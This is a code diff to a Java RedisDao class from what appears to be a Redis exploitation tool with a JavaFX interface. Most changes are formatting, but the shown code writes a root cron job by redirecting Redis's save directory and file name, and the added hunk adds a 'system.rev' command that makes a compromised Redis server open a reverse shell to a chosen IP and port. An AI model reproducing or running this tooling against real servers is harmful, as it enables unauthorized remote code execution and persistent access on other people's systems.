@@ -57,7 +57,7 @@ public class RedisDao {
         }
     }
 
-    public void getConnection() throws Exception{
+    public void getConnection() throws Exception {
         CONN = new Jedis(ip, port, timeout);
         if (password.length() != 0) {
             CONN.auth(password);
@@ -70,12 +70,12 @@ public class RedisDao {
         }
     }
 
-    public void getInfo() throws Exception{
+    public void getInfo() throws Exception {
         String info = CONN.info();
         dir = CONN.configGet("dir");
-        OS = Utils.regularMatch("os:(.*)",info);
-        redisVersion = Utils.regularMatch("redis_version:(.*)",info);
-        arch = Utils.regularMatch("arch_bits:(.*)",info);
+        OS = Utils.regularMatch("os:(.*)", info);
+        redisVersion = Utils.regularMatch("redis_version:(.*)", info);
+        arch = Utils.regularMatch("arch_bits:(.*)", info);
 
         List<String> dbfilename = CONN.configGet("dbfilename");
         //String orginDir = StringUtils.join(dir, ": ");
@@ -123,7 +123,7 @@ public class RedisDao {
                 CONN.configSet("dbfilename", "root");
                 CONN.save();
                 Platform.runLater(() -> {
-                    redisController.redisLogTextFArea.appendText(Utils.log(dir + "root 写入 CRON 计划任务成功！" ));
+                    redisController.redisLogTextFArea.appendText(Utils.log(dir + "root 写入 CRON 计划任务成功！"));
                 });
                 break;
             } catch (Exception e) {
@@ -204,6 +204,33 @@ public class RedisDao {
         }
     }
 
+    public enum SysRevShell implements ProtocolCommand {
+        REV_SHELL("system.rev");
+
+        private final byte[] raw;
+
+        SysRevShell(String alt) {
+            raw = SafeEncoder.encode(alt);
+        }
+
+        @Override
+        public byte[] getRaw() {
+            return raw;
+        }
+    }
+
+    public String revShell(String revIp, String revPort) {
+        String result = "";
+        try {
+            CONN.sendCommand(SysRevShell.REV_SHELL, revIp, revPort);
+        } catch (Exception e) {
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
+        }
+        return result;
+    }
+
     public String eval(String command, String code) {
         String result = "";
         try {
@@ -254,7 +281,7 @@ public class RedisDao {
             Platform.runLater(() -> {
                 redisController.redisLogTextFArea.appendText(Utils.log("删除 Key 成功！"));
             });
-        }catch (Exception e){
+        } catch (Exception e) {
             Platform.runLater(() -> {
                 MessageUtil.showExceptionMessage(e, e.getMessage());
             });
